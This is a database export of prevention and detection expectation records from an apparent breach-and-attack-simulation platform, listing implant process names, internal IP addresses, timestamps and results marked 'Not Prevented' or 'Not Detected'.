87e26b32-1d2d-4287-8b73-bfd30b26474f	2026-01-09 15:35:04.578784+00	2026-01-09 21:35:19.455472+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	5e2a54ac-74d9-4191-8a2e-aeb7e480c742	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.346190877Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-5e2a54ac-74d9-4191-8a2e-aeb7e480c742-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:35:18.297235273Z"},{"type":"end_date","value":"2026-01-09T15:35:19.129235Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
9daa9a69-4efd-47e8-bf34-3f7f366ed8d0	2026-01-09 15:35:04.033288+00	2026-01-09 21:35:19.384166+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	0d9e412f-7003-4545-a65f-26184b48b173	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.173421309Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-0d9e412f-7003-4545-a65f-26184b48b173-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:35:19.052566262Z"},{"type":"end_date","value":"2026-01-09T15:37:32.934566Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
c6c2efbf-5e48-438a-8f57-f515ebe7eff9	2026-01-09 15:35:04.081357+00	2026-01-09 21:35:19.430206+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	0d9e412f-7003-4545-a65f-26184b48b173	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.276861185Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-0d9e412f-7003-4545-a65f-26184b48b173-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:35:19.052566262Z"},{"type":"end_date","value":"2026-01-09T15:37:32.934566Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
4a0cd785-1742-41aa-a47e-9cfe17d4940e	2026-01-09 15:35:04.569441+00	2026-01-09 21:35:19.450458+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	5e2a54ac-74d9-4191-8a2e-aeb7e480c742	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.278047540Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-5e2a54ac-74d9-4191-8a2e-aeb7e480c742-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:35:18.297235273Z"},{"type":"end_date","value":"2026-01-09T15:35:19.129235Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
b96037f8-8ac8-4fd4-804b-816ced25ed5c	2026-01-09 15:41:03.892744+00	2026-01-09 21:41:19.885003+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	36daa8c0-d058-4347-badf-2822a38dd8b1	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:41:19.250831436Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
6a33ae84-5b4f-4617-bc61-d2da7a7dbcfa	2026-01-09 15:39:05.089198+00	2026-01-09 21:39:19.380484+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	88fb9ac5-0396-4b3e-be00-648b20ec7758	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:39:19.168368311Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
748c489e-e6e7-4bcc-b910-a97399623212	2026-01-09 15:41:03.894957+00	2026-01-09 21:41:19.897426+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	36daa8c0-d058-4347-badf-2822a38dd8b1	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:41:19.250831436Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-36daa8c0-d058-4347-badf-2822a38dd8b1-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"start_date","value":"2026-01-09T15:41:22.659469329Z"},{"type":"end_date","value":"2026-01-09T15:41:28.368469Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
9d0232bd-d604-4fa3-92d0-1c24d460aae3	2026-01-09 15:40:03.653268+00	2026-01-09 21:40:19.301554+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2343768a-1a7b-41bf-920b-ce4efd6cb99d	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:40:19.178141222Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
a8517f1c-d652-4e67-a5a1-9709a3c7d32f	2026-01-09 15:40:03.659909+00	2026-01-09 21:40:19.30808+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2343768a-1a7b-41bf-920b-ce4efd6cb99d	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:40:19.178141222Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-2343768a-1a7b-41bf-920b-ce4efd6cb99d-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"start_date","value":"2026-01-09T15:40:19.060978983Z"},{"type":"end_date","value":"2026-01-09T15:40:21.606979Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
b24e20bc-a8f0-421e-931a-82660dce6fb5	2026-01-09 15:53:03.813021+00	2026-01-09 21:53:19.891826+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	e123988d-c196-494a-bdf7-b367b76ef878	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.613493926Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
28733eb5-53ca-4219-844c-61aa62082afa	2026-01-09 15:53:03.813465+00	2026-01-09 21:53:19.897043+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	c58cdfeb-05e0-4160-8426-0ee508c331ba	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.189315213Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
53f00d24-8de1-45db-b0d8-97db30678da4	2026-01-09 15:37:03.679186+00	2026-01-09 21:37:19.548179+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	27782be0-6497-48f6-9052-ca59d1a56205	\N	DETECTION	0	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:37:19.488514030Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-27782be0-6497-48f6-9052-ca59d1a56205-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"source_ipv6_address","value":"fe80::71d2:70e:b0a9:c611"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"start_date","value":"2026-01-09T15:37:43.079778677Z"},{"type":"end_date","value":"2026-01-09T15:37:44.972779Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
33569b25-822d-4a62-834f-0e039596b4cf	2026-01-09 15:40:03.678329+00	2026-01-09 21:40:19.309956+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2343768a-1a7b-41bf-920b-ce4efd6cb99d	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:40:19.292422651Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
2158a206-83fe-45ee-b6d1-d7f26c99c2da	2026-01-09 15:41:03.896711+00	2026-01-09 21:41:19.900332+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	36daa8c0-d058-4347-badf-2822a38dd8b1	\N	DETECTION	0	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:41:19.877417473Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
130afe0a-7d6b-41b7-b95d-ce04e9955c1d	2026-01-09 15:53:03.820289+00	2026-01-09 21:53:19.956854+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	c58cdfeb-05e0-4160-8426-0ee508c331ba	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.868442245Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
c30c5c8a-d10a-42b5-a4fd-fa1cf289e3c0	2026-01-09 15:32:04.31956+00	2026-01-09 21:32:19.423585+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	635fc963-f7b3-4468-ab3f-ad6271b2a22d	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:32:19.405177798Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-635fc963-f7b3-4468-ab3f-ad6271b2a22d-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"start_date","value":"2026-01-09T15:32:31.099985721Z"},{"type":"end_date","value":"2026-01-09T15:32:32.191986Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
4730e69b-4c16-40c7-8d2d-d644ca6b5380	2026-01-09 15:30:04.022108+00	2026-01-09 21:30:19.522741+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	56984800-c07d-4aed-814a-11a19c816b26	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:30:19.235029665Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-56984800-c07d-4aed-814a-11a19c816b26-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:30:15.550998097Z"},{"type":"end_date","value":"2026-01-09T15:30:17.079998Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
74d6e946-f4c2-4d2e-becd-87ca0a7f8217	2026-01-09 15:30:04.03928+00	2026-01-09 21:30:19.525884+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	56984800-c07d-4aed-814a-11a19c816b26	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:30:19.414701279Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
0f877997-d03f-43f1-92e7-4eb77fdeff66	2026-01-09 15:30:04.044703+00	2026-01-09 21:30:19.527416+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	56984800-c07d-4aed-814a-11a19c816b26	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:30:19.414701279Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-56984800-c07d-4aed-814a-11a19c816b26-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:30:15.550998097Z"},{"type":"end_date","value":"2026-01-09T15:30:17.079998Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
883d8e2a-107c-4c48-bf19-d5267a4cecbf	2026-01-09 15:33:04.077061+00	2026-01-09 21:33:19.433607+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	dad12758-dbee-4646-aca3-bacaa332485c	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:33:19.393505040Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-dad12758-dbee-4646-aca3-bacaa332485c-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"start_date","value":"2026-01-09T15:33:31.869422839Z"},{"type":"end_date","value":"2026-01-09T15:34:12.404423Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
ec00d055-ea74-4ee9-a988-fccd9ff81f50	2026-01-09 15:35:04.573347+00	2026-01-09 21:35:19.454329+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	5e2a54ac-74d9-4191-8a2e-aeb7e480c742	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.346190877Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
b8cece6d-8397-443e-a4ad-a1713239fa03	2026-01-09 15:37:03.675425+00	2026-01-09 21:37:19.538601+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	27782be0-6497-48f6-9052-ca59d1a56205	\N	DETECTION	0	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:37:19.488514030Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
0ef283a4-9aeb-4842-b2fe-aefd976b0bfb	2026-01-09 15:39:05.096034+00	2026-01-09 21:39:19.38305+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	88fb9ac5-0396-4b3e-be00-648b20ec7758	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:39:19.168368311Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-88fb9ac5-0396-4b3e-be00-648b20ec7758-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"start_date","value":"2026-01-09T15:39:43.404854743Z"},{"type":"end_date","value":"2026-01-09T15:39:45.035855Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
abeb2feb-75bc-48d8-9c6a-b40a2cf93c94	2026-01-09 15:39:05.106786+00	2026-01-09 21:39:19.38412+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	88fb9ac5-0396-4b3e-be00-648b20ec7758	\N	DETECTION	0	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:39:19.366961042Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
63296c3f-af0c-4256-8dec-a903988d612f	2026-01-09 15:39:05.110521+00	2026-01-09 21:39:19.386494+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	88fb9ac5-0396-4b3e-be00-648b20ec7758	\N	DETECTION	0	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:39:19.366961042Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-88fb9ac5-0396-4b3e-be00-648b20ec7758-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"start_date","value":"2026-01-09T15:39:43.404854743Z"},{"type":"end_date","value":"2026-01-09T15:39:45.035855Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
d44810a9-14f6-443e-86f1-749da5ff88b8	2026-01-09 15:40:03.680146+00	2026-01-09 21:40:19.311005+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2343768a-1a7b-41bf-920b-ce4efd6cb99d	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:40:19.292422651Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-2343768a-1a7b-41bf-920b-ce4efd6cb99d-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"start_date","value":"2026-01-09T15:40:19.060978983Z"},{"type":"end_date","value":"2026-01-09T15:40:21.606979Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
30fa75bc-cb23-4a94-b523-a9842270dc72	2026-01-09 15:41:03.898509+00	2026-01-09 21:41:19.902847+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	36daa8c0-d058-4347-badf-2822a38dd8b1	\N	DETECTION	0	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:41:19.877417473Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-36daa8c0-d058-4347-badf-2822a38dd8b1-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"start_date","value":"2026-01-09T15:41:22.659469329Z"},{"type":"end_date","value":"2026-01-09T15:41:28.368469Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
c1c98974-24ed-444b-89ad-0de1795a5675	2026-01-09 15:53:03.81789+00	2026-01-09 21:53:19.902056+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	c58cdfeb-05e0-4160-8426-0ee508c331ba	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.189315213Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-c58cdfeb-05e0-4160-8426-0ee508c331ba-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:53:42.570815217Z"},{"type":"end_date","value":"2026-01-09T15:53:44.371815Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
0cffedb7-6b08-45cd-84f3-3402d5050eb0	2026-01-09 15:53:03.818049+00	2026-01-09 21:53:19.944439+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	e123988d-c196-494a-bdf7-b367b76ef878	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.613493926Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-e123988d-c196-494a-bdf7-b367b76ef878-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:53:42.371419966Z"},{"type":"end_date","value":"2026-01-09T15:53:44.074420Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
95c9fc17-257e-4646-b48a-970a5fca5887	2026-01-09 15:53:03.825546+00	2026-01-09 21:53:19.969315+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	c58cdfeb-05e0-4160-8426-0ee508c331ba	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.868442245Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-c58cdfeb-05e0-4160-8426-0ee508c331ba-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:53:42.570815217Z"},{"type":"end_date","value":"2026-01-09T15:53:44.371815Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
4a52001f-9ec1-4e96-8119-2e2015f7afac	2026-01-09 15:53:03.826112+00	2026-01-09 21:53:19.97185+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	e123988d-c196-494a-bdf7-b367b76ef878	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.868605259Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
3d0f8139-c0f7-4c85-81aa-10c1679c6edc	2026-01-09 15:53:03.840674+00	2026-01-09 21:53:19.973349+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	e123988d-c196-494a-bdf7-b367b76ef878	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:53:19.868605259Z","score":0.0,"result":"Not Detected","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-e123988d-c196-494a-bdf7-b367b76ef878-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-09T15:53:42.371419966Z"},{"type":"end_date","value":"2026-01-09T15:53:44.074420Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
879f42f9-4def-4096-9caf-2142c22a7942	2026-01-16 08:18:01.495298+00	2026-01-16 08:18:01.495306+00	\N	\N	5f5326d3-d9bb-4618-8d73-1ee582e96623	\N	PREVENTION	\N	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[]	\N	21600	\N
b0b76a7f-6abd-4ffc-a04d-48725c47573e	2026-01-16 08:18:01.515156+00	2026-01-16 08:18:01.515165+00	\N	\N	5f5326d3-d9bb-4618-8d73-1ee582e96623	\N	DETECTION	\N	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[]	\N	21600	\N
efbd1929-dae8-43e3-a2be-cd1cfb042fa4	2026-01-16 08:18:01.504518+00	2026-01-16 08:18:12.523081+00	\N	\N	5f5326d3-d9bb-4618-8d73-1ee582e96623	\N	PREVENTION	\N	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[]	[{"type":"parent_process_name","value":"oaev-implant-5f5326d3-d9bb-4618-8d73-1ee582e96623-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"source_ipv6_address","value":"fe80::71d2:70e:b0a9:c611"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"start_date","value":"2026-01-16T08:18:06.518881671Z"},{"type":"end_date","value":"2026-01-16T08:18:12.514882Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
85d71184-557b-4f6e-aa58-bc1597d7eaa5	2026-01-16 08:18:01.519822+00	2026-01-16 08:18:12.52467+00	\N	\N	5f5326d3-d9bb-4618-8d73-1ee582e96623	\N	DETECTION	\N	\N	\N	100	Detection	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[]	[{"type":"parent_process_name","value":"oaev-implant-5f5326d3-d9bb-4618-8d73-1ee582e96623-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"source_ipv6_address","value":"fe80::71d2:70e:b0a9:c611"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"start_date","value":"2026-01-16T08:18:06.518881671Z"},{"type":"end_date","value":"2026-01-16T08:18:12.514882Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
447629af-9c84-4219-8c8d-423e635a04cc	2026-01-16 08:45:00.954427+00	2026-01-16 08:45:00.954432+00	\N	\N	41ce0c39-b9f4-41c7-b899-bd0f356800f2	\N	PREVENTION	\N	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[]	\N	21600	\N
